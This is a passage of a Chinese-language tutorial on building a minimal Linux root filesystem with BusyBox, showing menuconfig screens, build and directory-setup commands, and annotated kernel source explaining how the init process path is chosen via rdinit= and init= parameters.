 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> └</font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>───────────</b></font></span><span style="background-color:#D0CFCC"><font color="#26A269"><b>↓(+)</b></font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>─────────────────────────────────────────────────────────────────────────────┘</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>├────────────────────────────────────────────────────────────────────────────────────────────────</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">┤</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">                                </font></span><span style="background-color:#12488B"><font color="#D0CFCC"><b>&lt;S</b></font></span><span style="background-color:#12488B"><font color="#A2734C"><b>elect</b></font></span><span style="background-color:#12488B"><font color="#D0CFCC"><b>&gt;</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">    &lt;</font></span><span style="background-color:#D0CFCC"><font color="#171421"><b> </b></font></span><span style="background-color:#D0CFCC"><font color="#C01C28">E</font></span><span style="background-color:#D0CFCC"><font color="#171421"><b>xit </b></font></span><span style="background-color:#D0CFCC"><font color="#171421">&gt;    &lt;</font></span><span style="background-color:#D0CFCC"><font color="#171421"><b> </b></font></span><span style="background-color:#D0CFCC"><font color="#C01C28">H</font></span><span style="background-color:#D0CFCC"><font color="#171421"><b>elp </b></font></span><span style="background-color:#D0CFCC"><font color="#171421">&gt;                                │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>└</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">────────────────────────────────────────────────────────────────────────────────────────────────┘</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3"><b>    </b></font></span>
 </pre></li>
<li><p>设置安装目录，这里我们选择的是 <code>./rootfs</code>。</p>
 <pre><span style="background-color:#12488B"><font color="#2AA1B3"><b> BusyBox 1.37.0 Configuration</b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3"><b> ─────────────────────────────────────────────────────────────────────────────────────────────────────</b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>┌───────────────────────────────────────────</b></font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b> Settings </b></font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>───────────────────────────────────────────</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">┐</font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">  Arrow keys navigate the menu.  &lt;Enter&gt; selects submenus ---&gt;.  Highlighted letters are        │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">  hotkeys.  Pressing &lt;Y&gt; includes, &lt;N&gt; excludes, &lt;M&gt; modularizes features.  Press &lt;Esc&gt;&lt;Esc&gt; to │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">  exit, &lt;?&gt; for Help, &lt;/&gt; for Search.  Legend: [*] built-in  [ ] excluded  &lt;M&gt; module  &lt; &gt;      │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">  module capable                                                                                │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> ┌───────────</font></span><span style="background-color:#D0CFCC"><font color="#26A269"><b>↑(-)</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">─────────────────────────────────────────────────────────────────────────────</font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>┐</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           ()  </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>A</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">dditional LDLIBS (NEW)                                                      </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           [ ] </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>A</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">void using GCC-specific code constructs (NEW)                               </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           [*] </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>U</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">se -mpreferred-stack-boundary=2 on i386 arch (NEW)                          </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           [*] </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>U</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">se -static-libgcc (NEW)                                                     </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           --- Installation Options (&quot;make install&quot; behavior)                               </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │               </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>W</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">hat kind of applet links to install (as soft-links)  ---&gt;                   </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           </font></span><span style="background-color:#12488B"><font color="#D0CFCC"><b>(./rootfs) </b></font></span><span style="background-color:#12488B"><font color="#A2734C"><b>D</b></font></span><span style="background-color:#12488B"><font color="#D0CFCC"><b>estination path for &apos;make install&apos;</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">                                   </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           --- Debugging Options                                                            </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           [ ] </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>B</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">uild with debug information (NEW)                                           </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           [ ] </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>E</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">nable runtime sanitizers (ASAN/LSAN/USAN/etc...) (NEW)                      </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           [ ] </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>B</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">uild unit tests (NEW)                                                       </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           [ ] </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>A</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">bort compilation on any warning (NEW)                                       </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           [ ] </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>W</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">arn about single parameter bb_xx_msg calls (NEW)                            </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> └</font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>───────────</b></font></span><span style="background-color:#D0CFCC"><font color="#26A269"><b>↓(+)</b></font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>─────────────────────────────────────────────────────────────────────────────┘</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>├────────────────────────────────────────────────────────────────────────────────────────────────</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">┤</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">                                </font></span><span style="background-color:#12488B"><font color="#D0CFCC"><b>&lt;S</b></font></span><span style="background-color:#12488B"><font color="#A2734C"><b>elect</b></font></span><span style="background-color:#12488B"><font color="#D0CFCC"><b>&gt;</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">    &lt;</font></span><span style="background-color:#D0CFCC"><font color="#171421"><b> </b></font></span><span style="background-color:#D0CFCC"><font color="#C01C28">E</font></span><span style="background-color:#D0CFCC"><font color="#171421"><b>xit </b></font></span><span style="background-color:#D0CFCC"><font color="#171421">&gt;    &lt;</font></span><span style="background-color:#D0CFCC"><font color="#171421"><b> </b></font></span><span style="background-color:#D0CFCC"><font color="#C01C28">H</font></span><span style="background-color:#D0CFCC"><font color="#171421"><b>elp </b></font></span><span style="background-color:#D0CFCC"><font color="#171421">&gt;                                │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>└</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">────────────────────────────────────────────────────────────────────────────────────────────────┘</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3"><b>    </b></font></span>
 </pre></li>
</ol>
</li>
<li><p>编译安装 busybox。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -j$(<span class="built_in">nproc</span>)</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p>完成上述步骤后，编译好的 busybox 会被安装在源码目录下的 <code>rootfs</code> 文件夹中，结构如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">rootfs</span><br><span class="line">├── bin</span><br><span class="line">│   ├── arch -&gt; busybox</span><br><span class="line">│   ├── ash -&gt; busybox</span><br><span class="line">│   ├── base32 -&gt; busybox</span><br><span class="line">│   ├── [...]</span><br><span class="line">├── linuxrc -&gt; bin/busybox</span><br><span class="line">├── sbin</span><br><span class="line">│   ├── acpid -&gt; ../bin/busybox</span><br><span class="line">│   ├── adjtimex -&gt; ../bin/busybox</span><br><span class="line">│   ├── arp -&gt; ../bin/busybox</span><br><span class="line">│   ├── [...]</span><br><span class="line">└── usr</span><br><span class="line">    ├── bin</span><br><span class="line">    │   ├── [ -&gt; ../../bin/busybox</span><br><span class="line">    │   ├── [[ -&gt; ../../bin/busybox</span><br><span class="line">    │   ├── ascii -&gt; ../../bin/busybox</span><br><span class="line">    │   ├── [...]</span><br><span class="line">    └── sbin</span><br><span class="line">        ├── add-shell -&gt; ../../bin/busybox</span><br><span class="line">        ├── addgroup -&gt; ../../bin/busybox</span><br><span class="line">        ├── adduser -&gt; ../../bin/busybox</span><br><span class="line">        ├── [...]</span><br></pre></td></tr></table></figure></div>

<h4 id="初始化文件系统"><a href="#初始化文件系统" class="headerlink" title="初始化文件系统"></a>初始化文件系统</h4><p>主要是在 <code>rootfs</code> 目录上创建一些基本的目录和文件。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> rootfs</span><br><span class="line"><span class="built_in">mkdir</span> -pv &#123;bin,sbin,etc,dev,tmp,proc,sys,home,root,lib64,lib/x86_64-linux-gnu,usr/&#123;bin,sbin&#125;&#125;</span><br><span class="line"><span class="built_in">touch</span> etc/inittab</span><br><span class="line"><span class="built_in">mkdir</span> etc/init.d</span><br><span class="line"><span class="built_in">touch</span> etc/init.d/rcS</span><br><span class="line"><span class="built_in">chmod</span> +x ./etc/init.d/rcS</span><br></pre></td></tr></table></figure></div>

<ol>
<li><p>在 busybox 编译安装到的 <code>rootfs</code> 目录下创建必要的目录。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -pv &#123;bin,sbin,etc,dev,tmp,proc,sys,home,root,lib64,lib/x86_64-linux-gnu,usr/&#123;bin,sbin&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>**<code>bin</code>**：用户级别的命令二进制文件。</li>
<li>**<code>sbin</code>**：系统管理命令二进制文件。</li>
<li>**<code>etc</code>**：系统配置文件。</li>
<li>**<code>dev</code>**：设备文件，表示系统中所有的硬件设备。</li>
<li>**<code>tmp</code>**：临时文件目录，通常存放应用程序临时产生的数据。</li>
<li><strong><code>proc</code></strong> 和 **<code>sys</code>**：虚拟文件系统，分别提供进程信息和内核状态信息。</li>
<li>**<code>home</code>**：用户的家目录，通常每个普通用户会有一个子目录。</li>
<li>**<code>root</code>**：root 用户的 home 目录。</li>
<li>**<code>lib64</code>**：64 位的共享库文件。</li>
<li>**<code>lib/x86_64-linux-gnu</code>**：这是特定平台（如 x86_64 架构）下的库文件目录。</li>
<li><strong><code>usr/bin</code></strong> 和 **<code>usr/sbin</code>**：存放应用程序和系统管理工具的二进制文件。</li>
</ul>
</li>
<li><p>创建 <code>inittab</code> 文件</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> etc/inittab</span><br></pre></td></tr></table></figure></div>

<p><code>inittab</code> 是 SystemV init 制度下的初始化配置文件，用于定义系统启动时运行哪个程序（通常是 <code>init</code>），以及启动哪些运行级别（runlevel）。在某些非常精简的环境中你可能需要一个简化的或自定义的 <code>inittab</code> 文件，即使是空的也可先占位。</p>
</li>
<li><p>创建 <code>etc/init.d</code> 目录与 <code>rcS</code> 文件</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> etc/init.d</span><br><span class="line"><span class="built_in">touch</span> etc/init.d/rcS</span><br><span class="line"><span class="built_in">chmod</span> +x ./etc/init.d/rcS</span><br></pre></td></tr></table></figure></div>

<p><code>init.d</code> 目录通常存放系统初始化脚本，用来在特定运行级别或启动阶段执行初始化任务，如挂载文件系统、启动网络服务、设置时区等。</p>
<p>创建 <code>rcS</code> 文件作为一个初始启动脚本，并对其赋予可执行权限（<code>chmod +x</code>）。该脚本在系统启动过程的早期阶段被运行。</p>
</li>
</ol>
<h4 id="配置初始化脚本"><a href="#配置初始化脚本" class="headerlink" title="配置初始化脚本"></a>配置初始化脚本</h4><p>配置初始化脚本这里根据文件系统的类型有所区分。</p>
<h5 id="initrd-磁盘启动脚本路径"><a href="#initrd-磁盘启动脚本路径" class="headerlink" title="initrd 磁盘启动脚本路径"></a>initrd 磁盘启动脚本路径</h5><p>初始化 RAM 磁盘（<code>initrd</code> 或 <code>initramfs</code>）中运行的启动脚本或程序由内核参数 <code>rdinit</code> 指定，在 <code>rdinit_setup</code> 函数中会将该参数指定的路径赋值给全局变量 <code>ramdisk_execute_command</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">rdinit_setup</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	ramdisk_execute_command = str;</span><br><span class="line">	<span class="comment">/* See &quot;auto&quot; comment in init_setup */</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; MAX_INIT_ARGS; i++)</span><br><span class="line">		argv_init[i] = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">__setup(<span class="string">&quot;rdinit=&quot;</span>, rdinit_setup);</span><br></pre></td></tr></table></figure></div>

<p>如何不指定 <code>rdinit</code> 参数则在 <code>kernel_init -&gt; kernel_init_freeable</code> 中设置为默认路径 <code>/init</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ramdisk_execute_command)</span><br><span class="line">	ramdisk_execute_command = <span class="string">&quot;/init&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>kernel_init</code> 中会在用户空间运行 <code>ramdisk_execute_command</code> 指定的程序创建 <code>init</code> 进程。 </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ramdisk_execute_command) &#123;</span><br><span class="line">	ret = run_init_process(ramdisk_execute_command);</span><br><span class="line">	<span class="keyword">if</span> (!ret)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	pr_err(<span class="string">&quot;Failed to execute %s (error %d)\n&quot;</span>,</span><br><span class="line">	       ramdisk_execute_command, ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们可以通过内核参数 <code>rdinit</code> 指定 <code>init</code> 进程对应的可执行程序，或者使用默认的 <code>\init</code> 路径。</p>
<h5 id="hda-磁盘启动脚本路径"><a href="#hda-磁盘启动脚本路径" class="headerlink" title="hda 磁盘启动脚本路径"></a>hda 磁盘启动脚本路径</h5><p>对于像 hda 这样的块设备作为磁盘的情况，需要通过内核参数 <code>init</code> 来指定初始化脚本路径。在 <code>init_setup</code> 函数中这个路径会被赋值到 <code>execute_command</code> 变量中。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">init_setup</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置初始化进程的命令行路径（即 init 进程的路径）</span></span><br><span class="line">    execute_command = str;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果 LILO 引导程序使用默认的命令行启动，</span></span><br><span class="line"><span class="comment">     * 它会在整个命令行前面加上 &quot;auto&quot;，这使得 shell 认为应该</span></span><br><span class="line"><span class="comment">     * 执行名为 &quot;auto&quot; 的脚本。</span></span><br><span class="line"><span class="comment">     * 所以，我们会忽略 init= 参数之前的所有命令行参数。[MJ]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; MAX_INIT_ARGS; i++)</span><br><span class="line">        argv_init[i] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">__setup(<span class="string">&quot;init=&quot;</span>, init_setup);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>在 <code>kernel_init</code> 函数中如果没有指定 <code>initrd</code> 类型磁盘的初始化脚本路径则会尝试执行 <code>hda</code> 类型磁盘的初始化脚本。如果 <code>hda</code> 类型磁盘没有指定初始化脚本则会依次尝试执行 <code>/sbin/init</code>，<code>/etc/init</code>，<code>/bin/init</code>，<code>/bin/sh</code> 作为 <code>init</code> 进程。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __ref <span class="title function_">kernel_init</span><span class="params">(<span class="type">void</span> *unused)</span></span><br><span class="line">&#123;</span><br><span class="line">    [...]</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 尝试执行指定的初始化命令（如 /init）直到其中一个成功为止</span></span><br><span class="line"><span class="comment">     * 如果执行失败，会继续尝试其他路径的 init 程序。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (execute_command) &#123;</span><br><span class="line">        ret = run_init_process(execute_command);</span><br><span class="line">        <span class="keyword">if</span> (!ret)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 如果命令执行成功，返回 0 退出</span></span><br><span class="line">        panic(<span class="string">&quot;Requested init %s failed (error %d).&quot;</span>, <span class="comment">// 如果执行失败，输出错误并引发内核恐慌</span></span><br><span class="line">              execute_command, ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试执行默认路径下的 init 程序，依次为 /sbin/init、/etc/init、/bin/init、/bin/sh</span></span><br><span class="line">    <span class="keyword">if</span> (!try_to_run_init_process(<span class="string">&quot;/sbin/init&quot;</span>) ||</span><br><span class="line">        !try_to_run_init_process(<span class="string">&quot;/etc/init&quot;</span>) ||</span><br><span class="line">        !try_to_run_init_process(<span class="string">&quot;/bin/init&quot;</span>) ||</span><br><span class="line">        !try_to_run_init_process(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 如果成功执行任何一个 init 程序，返回 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果没有找到有效的 init 程序，触发内核 panic 并输出错误信息</span></span><br><span class="line">    panic(<span class="string">&quot;No working init found.  Try passing init= option to kernel. &quot;</span></span><br><span class="line">          <span class="string">&quot;See Linux Documentation/admin-guide/init.rst for guidance.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们可以通过内核参数 <code>init</code> 指定 <code>init</code> 进程对应的可执行程序，或者使用默认的路径。</p>
